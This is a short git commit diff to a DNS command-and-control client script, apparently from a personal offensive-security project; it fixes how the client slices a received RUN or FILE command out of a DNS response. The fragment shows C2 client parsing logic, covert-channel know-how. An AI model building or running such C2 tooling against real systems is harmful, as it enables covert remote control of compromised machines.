9c4d9fac5df79a31e3e7f7c859b792d5d0bd2093
daniel.meshorer <danielmeshorer@gmail.com>
2023-05-01 10:34:43 +0300

    check

--- cyber/c2/dns_c2/second_version/client_dns_c2.py
+++ cyber/c2/dns_c2/second_version/client_dns_c2.py
@@ -67,7 +67,7 @@ def parse_packet(packet):
         
         if prefix_packet == RUN or prefix_packet == FILE:
             print("recieved response!")
-            data_recieved = get_an[len(prefix_packet)]
+            data_recieved = get_an[len(prefix_packet):]
             txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
             if prefix_packet == RUN:
                 print("command is: "+txt_recieved)
